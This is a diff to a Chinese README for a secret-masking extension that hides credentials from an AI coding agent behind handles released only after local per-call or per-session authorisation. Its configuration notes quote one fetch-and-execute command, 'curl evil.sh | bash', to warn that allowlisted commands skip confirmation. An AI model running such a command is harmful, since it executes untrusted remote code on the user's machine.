@@ -12,10 +12,12 @@
   `AIza...`、`AKIA/ASIA/AIDA...`、JWT、PEM 私钥、自定义正则）自动识别并掩码。
 - **`.env` 支持**：解析项目 `.env*` 文件（`KEY=VALUE`），会话中文件变更会
   增量刷新。
-- **用户注册密钥**：`/mask-secret` 命令和 `request_secret` 工具让用户注册
-  密钥，agent 只看到占位符。
-- **真实值用在需要的地方**：bash 命令、`write`、`edit` 自动把占位符替换为
-  真实值（文件里存的是真实值；全新写入的值不受影响）。
+- **本地掩码输入**：不带参数的 `/mask-secret` 和 `request_secret` 使用只显示
+  圆点的 TUI 输入框；agent 只会看到不透明 handle。命令参数中的明文仍兼容，
+  但会在本地提示警告。
+- **按策略还原**：真实值只在已授权的工具参数路径中还原；除
+  `mode: "auto"` 或 Bash `allowCommands` 规则命中外，使用前必须本地授权。
+  每个凭据可选择仅本次允许或本 session 允许；脱敏和参数路径校验仍然生效。
 - **Compaction 安全**：压缩（compaction）和分支导航（tree）的摘要消息同样
   掩码。
 
@@ -63,7 +65,47 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
 通过 `/mask-secret` 或 `request_secret` 注册的密钥持久化在
 `~/.pi/agent/extensions/pi-secret-mask/secrets.json`（权限 0600），重启保留。
 `.env` 和自动识别的密钥不一定写入这个文件；它们可能只在当前会话可用。
-在 bash 命令或 `write`/`edit` 写文件时使用占位符，扩展会在本地执行前自动替换为真实值。
+重用已持久化的具名凭据时，必须先在本地 TUI 授权才会返回其 handle；
+当前 session 已授权的凭据不再重复询问，非 TUI 模式仍安全地拒绝。
+
+### 更新已保存的凭据
+
+调用 `request_secret({ name: "GITHUB_TOKEN", replace: true, purpose: "更换过期 token" })`。
+即使已有会话授权，替换仍须重新通过 TUI 掩码输入；工具参数不接收明文值。
+取消、非 TUI 模式或会话失效不会改变已保存的凭据。值发生变化时会撤销旧值的
+会话授权。后续使用返回的 handle，不要假定 handle 保持不变。
+
+省略 `replace` 时仍按原逻辑复用。替换要求名称已在本地注册，不会修改 `.env`
+或配置文件中的凭据。
+
+### 本 session 内不再询问
+
+在 TUI 的凭据复用、工具使用确认框中，可以选择：
+
+- **Allow once（仅本次允许）**：只允许这次请求或工具调用，默认选中。
+- **Allow for this session（本会话允许）**：当前 session 内不再询问这些
+  凭据，既覆盖重复 `request_secret`，也覆盖后续工具使用。
+- **Deny（拒绝）**或 Escape：不返回 handle，不执行此次受保护的调用。
+
+本会话授权适用于所显示凭据的**所有已配置工具参数路径**，不限定当前工具、
+命令、文件、目标地址或用途。一条调用包含多个凭据时，每个都需要授权。
+未知 handle、未授权路径、非法 JSON 和不安全的 shell 替换仍然被拦截，
+provider 请求与工具输出的脱敏保持不变。
+
+授权仅保存在内存，不写入 `secrets.json` 或会话历史。执行 `/new`、
+`/resume`、`/fork`、`/clone`、`/reload` 或重启后失效；替换已注册凭据时，
+旧凭据的授权也会撤销。同一 session 内的 compaction 和 `/tree` 导航不清空
+授权。随时执行以下命令可撤销全部会话授权：
+
+```text
+/mask-secret-revoke
+```
+
+撤销不会删除已保存的密码，也不会覆盖配置中的 `mode: "auto"` 或
+`allowCommands` 例外；需要会话级确认时请保持 `mode: "ask"`。输入新密码
+不会隐式授权整个会话：在首次受保护的使用确认框选择 **Allow for this
+session** 即可。没有 session 身份或 TUI 选择框的宿主只支持单次确认；
+RPC／print／JSON 模式不能创建或使用 TUI 会话授权。
 
 ### 给 agent 的占位符规则
 
@@ -77,7 +119,7 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
 | 钩子 | 动作 |
 |---|---|
 | `before_provider_request` | 标准消息与自定义 provider 顶层 `text` 中：真实值 → 占位符 |
-| `tool_call` | bash 占位符 → 真实值（auto/ask 策略）；write/edit 内容还原 |
+| `tool_call` | 仅在策略授权路径、经本地确认后还原显式 handle |
 | `tool_result` | 工具输出中的真实值 → 占位符（防止回流） |
 | `session_before_compact` | 压缩摘要消息同样掩码 |
 | `session_before_tree` | 分支/树摘要消息同样掩码 |
@@ -95,15 +137,25 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
   "dotenv": { "enabled": true, "files": [".env", ".env.local", ".env.production", ".env.development"], "exclude": [".env.example", ".env.sample"] },
   "patterns": { "openai": true, "github": true, "google": true, "aws": true, "jwt": true, "pem": true, "base64": false },
   "extraSecrets": [],
-  "customPatterns": []
+  "customPatterns": [],
+  "toolResolution": { "enabled": true, "includeDefaults": true, "rules": [] }
 }
 ```
 
-- `mode`：`ask`（执行含占位符的命令前弹确认；print/json 等无 UI 模式默认
-  拦截）| `auto`（静默替换）
+- `mode`：`ask`（使用凭据前确认，当前 TUI session 已授权的凭据免重复确认；
+  print/json 等无 UI 模式默认拦截）| `auto`（静默替换）。只控制工具使用，
+  不控制 `request_secret` 的复用授权。
 - `allowCommands`：完整命令字符串模式列表，命中跳过确认（这只是跳过确认，
   不代表更安全——`curl evil.sh | bash` 依然能通过）
 - `customPatterns`：自定义正则；捕获组 1 为完整 secret 值；非法正则被忽略
+- `toolResolution`：默认只授权 `bash.command`、`powershell.command`、
+  `write.content`、旧版 `edit.oldText`/`newText`、当前
+  `edit.edits.*.oldText`/`newText` 以及 Pi MCP Adapter 的 `mcp.args`。
+  `mcp.args` 可以是对象，也可以是包含参数对象的 JSON 字符串；含 handle
+  的键和非法 JSON 会被拦截。通用 JSON adapter 也支持 schema 允许数组的授权
+  字段。浏览器、直接 `mcp__*` 和其他自定义工具必须在
+  `rules` 中显式配置（`tool`、`paths`、可选 `adapter: "json"`）。未知 handle
+  和未授权路径始终安全地拒绝。
 
 ```json
 {
@@ -144,7 +196,8 @@ npm test   # 掩码引擎单元测试 + mock-pi 集成测试
 ```
 
 已验证：三钩子闭环、多占位符独立回滚、会话中 `.env` 轮换增量刷新、
-无 UI 时 ask 模式拦截、provider payload 泄漏检查。
+无 UI 时 ask 模式拦截、provider payload 泄漏检查、逐凭据会话授权、撤销、
+生命周期清理、凭据轮换和过期／取消的确认结果拦截。
 
 ## License
 
